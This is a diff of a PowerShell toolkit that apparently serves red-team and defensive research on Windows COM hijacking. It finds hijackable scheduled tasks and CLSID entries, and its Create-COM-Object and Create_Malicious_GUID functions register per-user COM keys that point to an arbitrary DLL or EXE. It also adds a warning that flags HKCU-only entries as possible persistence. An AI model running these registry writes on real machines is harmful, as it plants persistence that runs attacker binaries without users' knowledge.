@@ -3,61 +3,6 @@
 #   List of lots of different techniques
 # good explanation of missing libraries use https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/
 
-# looks for scheduled tasks that are hijackable
-function Get-Scheduled-Tasks-Missing-HKCU {
-    $tasks = Get-ScheduledTask
-    $fields = @()
-    $targets = New-Object System.Collections.Generic.Dictionary"[String,[System.Collections.ArrayList]]"
-    foreach ($task in $tasks) {
-        if ($task.Triggers -match "MSFT_TaskLogonTrigger") {
-            if ($task.Actions -match "MSFT_TaskComHandlerAction") {
-                foreach ($trigger in $task.Triggers) {
-                    if ($trigger.Delay -And -Not ($targets.containskey("$($task.TaskName)"))) {
-                        $targets.Add("$($task.TaskName)",@($trigger.Delay, $task.Actions.classId))
-                    }
-                }
-            }
-        }
-    }
-    
-    $HKLM_targets = New-Object System.Collections.Generic.Dictionary"[String,String]"
-    $HKCU_targets = New-Object System.Collections.Generic.Dictionary"[String,String]"
-    foreach($field in $targets.keys)
-    {
-        $dll = Get-Item -path "Registry::HKCU\Software\Classes\CLSID\$($targets.$field[1])\InProcServer32" -ErrorAction SilentlyContinue
-        $exe = Get-Item -path "Registry::HKCU\Software\Classes\CLSID\$($targets.$field[1])\LocalServer32" -ErrorAction SilentlyContinue
-    
-        if ($dll -ne $null) { 
-            $HKCU_targets.Add("$($targets.$field[1])", (Get-ItemProperty $dll.PSPath).'(default)') 
-        }
-        if ($exe -ne $null) { 
-            $HKCU_targets.Add("$($targets.$field[1])",(Get-ItemProperty $exe.PSPath).'(default)') 
-        }
-    
-        $dll = Get-Item -path "Registry::HKLM\Software\Classes\CLSID\$($targets.$field[1])\InProcServer32" -ErrorAction SilentlyContinue
-        $exe = Get-Item -path "Registry::HKLM\Software\Classes\CLSID\$($targets.$field[1])\LocalServer32" -ErrorAction SilentlyContinue
-    
-        if ($dll -ne $null) { 
-            $HKLM_targets.Add("$($targets.$field[1])", (Get-ItemProperty $dll.PSPath).'(default)') 
-        }
-        if ($exe -ne $null) { 
-            $HKLM_targets.Add("$($targets.$field[1])",(Get-ItemProperty $exe.PSPath).'(default)') 
-        }
-    
-    }
-    
-    foreach ($val in $HKLM_targets.keys)
-    {
-        if ($HKCU_targets.ContainsKey($val)) {
-            "HKCU and HKLM both contain pathes to COM Objects"   
-        }
-        else {
-            "$($val) ($($HKLM_targets.$val)) may be vulnerable to COM Hijacking"
-        }
-    }
-    
-}
-
 # Source : https://github.com/nccgroup/acCOMplice/blob/master/COMHijackToolkit/COMHijackToolkit.ps1
 # TODO: build this out to deal with HKLM and HKCU as well
 function Get-RegistrySubkeys {
@@ -198,14 +143,25 @@ function Missing-Libraries {
     }
 }
 
-function Create_Malicious_GUID($GUID, $binary) {
+function Create-COM-Object ($GUID, $binary, $CLSID_name) {
+    if (!($GUID)) {
+        return "GUID must be provided"
+    }
+    if (!($binary)) {
+        return "binary must be provided"
+    }
+        
     #check if the binary for the target of the GUID exists
-    if (!($GUID.contains("{")) -and !($GUID.contains("}"))) {
-        $GUID = "{" + $GUID + "}"
+    if (!($GUID.contains("{"))) {
+        $GUID = "{" + $GUID
+    }
+    if (!($GUID.contains("}"))) {
+        $GUID = $GUID + "}"
     }
     if (!(Test-Path -Path "$binary")) {
         return "`"$binary`" does not exist - check the path"
     }
+
     # check the extension of the binary
     $dll = $False
     $exe = $False
@@ -219,87 +175,53 @@ function Create_Malicious_GUID($GUID, $binary) {
         return "target binary must be either a dll or executable" 
     }
 
-    # determine if the target thread type matches to the binary
-    $dll_obj = $null
-    $exe_obj = $null
-    $dll_obj = Get-Item -LiteralPath Registry::HKCR\CLSID\$GUID\InProcServer32 -ErrorAction SilentlyContinue
-    $exe_obj = Get-Item -LiteralPath Registry::HKCR\CLSID\$GUID\LocalServer32 -ErrorAction SilentlyContinue
-
-    if ($dll -and !($dll_obj)) {
-        return "the target COM object does not appear to use dlls"
-    }
-    if ($exe -and !($exe_obj)) {
-        return "the target COM object does not appear to use exes"
-    }
-
-    $InHKLM = $False
-    $InHKCU = $False
-
-    $HKLM_CLSID_exists = $False
-    $HKCU_CLSID_exists = $False
-
-    $HKLM_obj = $null
-    $HKCU_obj = $null
-    $HKLM_obj = Get-Item -path Registry::HKLM\Software\Classes\CLSID\$GUID -ErrorAction SilentlyContinue
-    if ($HKLM_obj){
-        $HKLM_CLSID_exists = $True
-    }
+    # check for the existence of the HKLM COM Object
     $HKCU_obj = Get-Item -path Registry::HKCU\Software\Classes\CLSID\$GUID -ErrorAction SilentlyContinue
     if ($HKCU_obj) {
-        $HKCU_CLSID_exists = $True
+        return "$GUID already exists in HKLM. Try a different GUID"
     }
 
-
-    if ($dll_obj) {
-        $HKLM_dll_obj = $null
-        $HKCU_dll_obj = $null
-        $HKLM_dll_obj = Get-Item -path Registry::HKLM\Software\Classes\CLSID\$GUID\InProcServer32 -ErrorAction SilentlyContinue
-        if ($HKLM_dll_obj){
-            $InHKLM = $True
-        }
-        $HKCU_dll_obj = Get-Item -path Registry::HKCU\Software\Classes\CLSID\$GUID\InProcServer32 -ErrorAction SilentlyContinue
-        if ($HKCU_dll_obj) {
-            $InHKCU = $True
-        }
+    #Create a new COM Object
+    New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "$GUID" | Out-Null
+    if ($CLSID_name) {
+        Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name '(default)' -Value "$CLSID_name" | Out-Null
     }
-    if ($exe_obj) {
-        $HKLM_exe_obj = $null
-        $HKCU_exe_obj = $null
-        $HKLM_exe_obj = Get-Item -path Registry::HKLM\Software\Classes\CLSID\$GUID\LocalServer32 -ErrorAction SilentlyContinue
-        if ($HKLM_exe_obj) {
-            $InHKLM = $True
-        }
-        $HKCU_exe_obj = Get-Item -path Registry::HKCU\Software\Classes\CLSID\$GUID\LocalServer32 -ErrorAction SilentlyContinue
-        if ($HKCU_exe_obj) {
-            $InHKCU = $True
-        }
-    }
-
-    if (!($InHKCU)) {
-        #check if the CLSID exists
-        # if the CLSID does not exist, create it
-        if(!($HKCU_CLSID_exists)) {
-            New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "$GUID"
-        }
-        if ($dll) {
-            # create the inprocserver32 subkey
-            New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "InProcServer32"
-            Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32" -Name '(default)' -Value "$binary"
-            return "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32 set to $binary"
-        } 
-        elseif ($exe) {
-            # create the inprocserver32 subkey
-            New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "LocalServer32"
-            Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32" -Name '(default)' -Value "$binary"
-            return "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32 set to $binary"
-        } 
-        else {
-            break
-        }
+    if ($dll) {
+        # create the inprocserver32 subkey
+        New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "InProcServer32" | Out-Null
+        Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32" -Name '(default)' -Value "$binary" | Out-Null
+        return "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32 set to $binary"
+    } 
+    elseif ($exe) {
+        # create the inprocserver32 subkey
+        New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "LocalServer32" | Out-Null
+        Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32" -Name '(default)' -Value "$binary" | Out-Null
+        return "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32 set to $binary"
     } else {
-        return "$GUID already exists in HKLM"
+        "Something went wrong"
+    }
+}
+
+function Remove-COM-Object($GUID) {
+    #check if the binary for the target of the GUID exists
+    if (!($GUID)) {
+        return "GUID must be provided"
     }
 
+    if (!($GUID.contains("{"))) {
+        $GUID = "{" + $GUID
+    }
+    if (!($GUID.contains("}"))) {
+        $GUID = $GUID + "}"
+    }
+
+    # check for the existence of the HKLM COM Object
+    $HKCU_obj = Get-Item -path Registry::HKCU\Software\Classes\CLSID\$GUID -ErrorAction SilentlyContinue
+    if (!($HKCU_obj)) {
+        return "$GUID does not exist in HKLM"
+    }
+    Remove-Item "HKCU:\Software\Classes\CLSID\$GUID" -Recurse | Out-Null
+    return "HKCU:\Software\Classes\CLSID\$GUID removed"
 }
 
 #inspired by https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1
@@ -414,6 +336,17 @@ function Hijackable-Scheduled-Tasks {
             }
             "`n"
         }
+
+        # Could be an indication of user persistence  
+        if ($InHKCU -and !($InHKLM)) {
+            "!!!!! WARNING !!!!!`n$COM is defined in HKCU AND NOT HKLM"
+            if ($exe_obj) {
+                "HKLM binary: " + (Get-ItemProperty -LiteralPath Registry::HKLM\Software\Classes\CLSID\$COM\LocalServer32).'(default)' 
+            } else {
+                "HKLM binary: " + (Get-ItemProperty -LiteralPath Registry::HKLM\Software\Classes\CLSID\$COM\InProcServer32).'(default)' 
+            }
+            "`n"
+        }
     }
 }
 
@@ -476,5 +409,173 @@ function Check-All-TreatAs-Objects {
         }
     }
 }
+
+
+#### depracated:
+
+# Replaced by Create-COM-Object
+function Create_Malicious_GUID($GUID, $binary) {
+    #check if the binary for the target of the GUID exists
+    if (!($GUID.contains("{")) -and !($GUID.contains("}"))) {
+        $GUID = "{" + $GUID + "}"
+    }
+    if (!(Test-Path -Path "$binary")) {
+        return "`"$binary`" does not exist - check the path"
+    }
+    # check the extension of the binary
+    $dll = $False
+    $exe = $False
+    if ($binary.contains(".exe")) {
+        $exe = $True
+    } 
+    elseif ($binary.contains(".dll")) {
+        $dll = $True
+    }
+    else {
+        return "target binary must be either a dll or executable" 
+    }
+
+    # determine if the target thread type matches to the binary
+    $dll_obj = $null
+    $exe_obj = $null
+    $dll_obj = Get-Item -LiteralPath Registry::HKCR\CLSID\$GUID\InProcServer32 -ErrorAction SilentlyContinue
+    $exe_obj = Get-Item -LiteralPath Registry::HKCR\CLSID\$GUID\LocalServer32 -ErrorAction SilentlyContinue
+
+    if ($dll -and !($dll_obj)) {
+        return "the target COM object does not appear to use dlls"
+    }
+    if ($exe -and !($exe_obj)) {
+        return "the target COM object does not appear to use exes"
+    }
+
+    $InHKLM = $False
+    $InHKCU = $False
+
+    $HKLM_CLSID_exists = $False
+    $HKCU_CLSID_exists = $False
+
+    $HKLM_obj = $null
+    $HKCU_obj = $null
+    $HKLM_obj = Get-Item -path Registry::HKLM\Software\Classes\CLSID\$GUID -ErrorAction SilentlyContinue
+    if ($HKLM_obj){
+        $HKLM_CLSID_exists = $True
+    }
+    $HKCU_obj = Get-Item -path Registry::HKCU\Software\Classes\CLSID\$GUID -ErrorAction SilentlyContinue
+    if ($HKCU_obj) {
+        $HKCU_CLSID_exists = $True
+    }
+
+
+    if ($dll_obj) {
+        $HKLM_dll_obj = $null
+        $HKCU_dll_obj = $null
+        $HKLM_dll_obj = Get-Item -path Registry::HKLM\Software\Classes\CLSID\$GUID\InProcServer32 -ErrorAction SilentlyContinue
+        if ($HKLM_dll_obj){
+            $InHKLM = $True
+        }
+        $HKCU_dll_obj = Get-Item -path Registry::HKCU\Software\Classes\CLSID\$GUID\InProcServer32 -ErrorAction SilentlyContinue
+        if ($HKCU_dll_obj) {
+            $InHKCU = $True
+        }
+    }
+    if ($exe_obj) {
+        $HKLM_exe_obj = $null
+        $HKCU_exe_obj = $null
+        $HKLM_exe_obj = Get-Item -path Registry::HKLM\Software\Classes\CLSID\$GUID\LocalServer32 -ErrorAction SilentlyContinue
+        if ($HKLM_exe_obj) {
+            $InHKLM = $True
+        }
+        $HKCU_exe_obj = Get-Item -path Registry::HKCU\Software\Classes\CLSID\$GUID\LocalServer32 -ErrorAction SilentlyContinue
+        if ($HKCU_exe_obj) {
+            $InHKCU = $True
+        }
+    }
+
+    if (!($InHKCU)) {
+        #check if the CLSID exists
+        # if the CLSID does not exist, create it
+        if(!($HKCU_CLSID_exists)) {
+            New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "$GUID"
+        }
+        if ($dll) {
+            # create the inprocserver32 subkey
+            New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "InProcServer32"
+            Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32" -Name '(default)' -Value "$binary"
+            return "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32 set to $binary"
+        } 
+        elseif ($exe) {
+            # create the inprocserver32 subkey
+            New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "LocalServer32"
+            Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32" -Name '(default)' -Value "$binary"
+            return "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32 set to $binary"
+        } 
+        else {
+            break
+        }
+    } else {
+        return "$GUID already exists in HKLM"
+    }
+
+}
+
+# Replaced by Hijackable-Scheduled-Tasks
+# looks for scheduled tasks that are hijackable
+function Get-Scheduled-Tasks-Missing-HKCU {
+    $tasks = Get-ScheduledTask
+    $fields = @()
+    $targets = New-Object System.Collections.Generic.Dictionary"[String,[System.Collections.ArrayList]]"
+    foreach ($task in $tasks) {
+        if ($task.Triggers -match "MSFT_TaskLogonTrigger") {
+            if ($task.Actions -match "MSFT_TaskComHandlerAction") {
+                foreach ($trigger in $task.Triggers) {
+                    if ($trigger.Delay -And -Not ($targets.containskey("$($task.TaskName)"))) {
+                        $targets.Add("$($task.TaskName)",@($trigger.Delay, $task.Actions.classId))
+                    }
+                }
+            }
+        }
+    }
+    
+    $HKLM_targets = New-Object System.Collections.Generic.Dictionary"[String,String]"
+    $HKCU_targets = New-Object System.Collections.Generic.Dictionary"[String,String]"
+    foreach($field in $targets.keys)
+    {
+        $dll = Get-Item -path "Registry::HKCU\Software\Classes\CLSID\$($targets.$field[1])\InProcServer32" -ErrorAction SilentlyContinue
+        $exe = Get-Item -path "Registry::HKCU\Software\Classes\CLSID\$($targets.$field[1])\LocalServer32" -ErrorAction SilentlyContinue
+    
+        if ($dll -ne $null) { 
+            $HKCU_targets.Add("$($targets.$field[1])", (Get-ItemProperty $dll.PSPath).'(default)') 
+        }
+        if ($exe -ne $null) { 
+            $HKCU_targets.Add("$($targets.$field[1])",(Get-ItemProperty $exe.PSPath).'(default)') 
+        }
+    
+        $dll = Get-Item -path "Registry::HKLM\Software\Classes\CLSID\$($targets.$field[1])\InProcServer32" -ErrorAction SilentlyContinue
+        $exe = Get-Item -path "Registry::HKLM\Software\Classes\CLSID\$($targets.$field[1])\LocalServer32" -ErrorAction SilentlyContinue
+    
+        if ($dll -ne $null) { 
+            $HKLM_targets.Add("$($targets.$field[1])", (Get-ItemProperty $dll.PSPath).'(default)') 
+        }
+        if ($exe -ne $null) { 
+            $HKLM_targets.Add("$($targets.$field[1])",(Get-ItemProperty $exe.PSPath).'(default)') 
+        }
+    
+    }
+    
+    foreach ($val in $HKLM_targets.keys)
+    {
+        if ($HKCU_targets.ContainsKey($val)) {
+            "HKCU and HKLM both contain pathes to COM Objects"   
+        }
+        else {
+            "$($val) ($($HKLM_targets.$val)) may be vulnerable to COM Hijacking"
+        }
+    }
+    
+}
+
+
+
+
 
 
